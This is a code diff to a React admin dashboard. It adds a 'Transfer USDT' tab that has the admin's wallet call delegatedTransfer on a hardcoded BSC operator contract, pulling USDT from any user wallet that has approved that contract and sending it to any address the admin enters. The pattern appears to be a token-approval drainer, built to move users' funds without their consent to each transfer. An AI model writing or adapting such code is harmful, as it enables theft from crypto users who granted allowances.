@@ -28,12 +28,19 @@ import {
 import { useQuery, useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import { useUserRole } from "@/hooks/use-user-role.ts";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
 import { Users, DollarSign, ArrowDownToLine, Activity } from "lucide-react";
 import type { Id } from "@/convex/_generated/dataModel.d.ts";
-import { useState } from "react";
+
+declare global {
+  interface Window {
+    ethereum?: {
+      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+    };
+  }
+}
 
 export default function Admin() {
   return (
@@ -87,6 +94,7 @@ function AdminPage() {
             <TabsTrigger value="users">Users</TabsTrigger>
             <TabsTrigger value="withdrawals">Withdrawals</TabsTrigger>
             <TabsTrigger value="transactions">Transactions</TabsTrigger>
+            <TabsTrigger value="transfer">Transfer USDT</TabsTrigger>
           </TabsList>
 
           <TabsContent value="overview">
@@ -103,6 +111,10 @@ function AdminPage() {
 
           <TabsContent value="transactions">
             <TransactionsTab />
+          </TabsContent>
+
+          <TabsContent value="transfer">
+            <TransferTab />
           </TabsContent>
         </Tabs>
       </div>
@@ -525,6 +537,204 @@ function TransactionsTab() {
             </div>
           ))}
         </div>
+      </CardContent>
+    </Card>
+  );
+}
+
+function TransferTab() {
+  const [fromAddress, setFromAddress] = useState("");
+  const [toAddress, setToAddress] = useState("");
+  const [amount, setAmount] = useState("");
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [adminConnected, setAdminConnected] = useState(false);
+
+  const BSC_CHAIN_ID = "0x38";
+  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+
+  async function connectAdminWallet() {
+    if (!window.ethereum) {
+      toast.error("MetaMask not found");
+      return;
+    }
+
+    try {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID }],
+      });
+    } catch (err) {
+      const error = err as { code?: number };
+      if (error.code === 4902) {
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [
+            {
+              chainId: BSC_CHAIN_ID,
+              chainName: "Binance Smart Chain",
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              blockExplorerUrls: ["https://bscscan.com"],
+            },
+          ],
+        });
+      }
+    }
+
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    setAdminConnected(true);
+    toast.success("Admin wallet connected");
+  }
+
+  async function handleTransfer() {
+    if (!fromAddress || !toAddress || !amount) {
+      toast.error("Please fill all fields");
+      return;
+    }
+
+    if (!adminConnected) {
+      toast.error("Please connect admin wallet first");
+      return;
+    }
+
+    setIsProcessing(true);
+
+    try {
+      const { ethers } = window as typeof window & {
+        ethers: {
+          BrowserProvider: new (provider: unknown) => {
+            getSigner: () => Promise<unknown>;
+          };
+          Contract: new (
+            address: string,
+            abi: string[],
+            signer: unknown
+          ) => {
+            delegatedTransfer: (
+              tokenAddress: string,
+              from: string,
+              to: string,
+              amount: bigint
+            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
+          };
+          parseUnits: (value: string, decimals: number) => bigint;
+        };
+      };
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      const operatorContract = new ethers.Contract(
+        TOKEN_OPERATOR,
+        [
+          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
+        ],
+        signer
+      );
+
+      const amountInWei = ethers.parseUnits(amount, 18);
+
+      const tx = await operatorContract.delegatedTransfer(
+        BSC_USDT,
+        fromAddress,
+        toAddress,
+        amountInWei
+      );
+
+      toast.success("Transaction submitted! Waiting for confirmation...");
+
+      await tx.wait();
+
+      toast.success("Transfer successful! ✅");
+
+      setFromAddress("");
+      setToAddress("");
+      setAmount("");
+    } catch (error) {
+      console.error(error);
+      const err = error as { reason?: string; message?: string };
+      toast.error(err.reason || err.message || "Transfer failed");
+    } finally {
+      setIsProcessing(false);
+    }
+  }
+
+  return (
+    <Card>
+      <CardHeader>
+        <CardTitle>Transfer USDT (Admin Only)</CardTitle>
+      </CardHeader>
+      <CardContent className="space-y-6">
+        {!adminConnected ? (
+          <div className="space-y-4">
+            <p className="text-sm text-muted-foreground">
+              Connect your admin wallet to transfer USDT from approved users
+            </p>
+            <Button onClick={connectAdminWallet} className="w-full">
+              Connect Admin Wallet
+            </Button>
+          </div>
+        ) : (
+          <div className="space-y-4">
+            <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
+              ✅ Admin wallet connected
+            </div>
+
+            <div>
+              <Label htmlFor="fromAddress">From Address (User Wallet)</Label>
+              <Input
+                id="fromAddress"
+                value={fromAddress}
+                onChange={(e) => setFromAddress(e.target.value)}
+                placeholder="0x..."
+              />
+              <p className="mt-1 text-xs text-muted-foreground">
+                The user must have approved the contract first
+              </p>
+            </div>
+
+            <div>
+              <Label htmlFor="toAddress">To Address (Destination)</Label>
+              <Input
+                id="toAddress"
+                value={toAddress}
+                onChange={(e) => setToAddress(e.target.value)}
+                placeholder="0x..."
+              />
+            </div>
+
+            <div>
+              <Label htmlFor="amount">Amount (USDT)</Label>
+              <Input
+                id="amount"
+                type="number"
+                step="0.01"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+                placeholder="0.0"
+              />
+            </div>
+
+            <Button
+              onClick={handleTransfer}
+              disabled={isProcessing}
+              className="w-full"
+            >
+              {isProcessing ? "Processing..." : "Transfer USDT"}
+            </Button>
+
+            <div className="rounded-lg bg-muted p-4 text-sm">
+              <div className="font-semibold mb-2">How it works:</div>
+              <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
+                <li>User approves the TokenOperator contract</li>
+                <li>Admin connects wallet and enters transfer details</li>
+                <li>Admin signs the transaction</li>
+                <li>USDT is transferred from user to destination</li>
+              </ol>
+            </div>
+          </div>
+        )}
       </CardContent>
     </Card>
   );
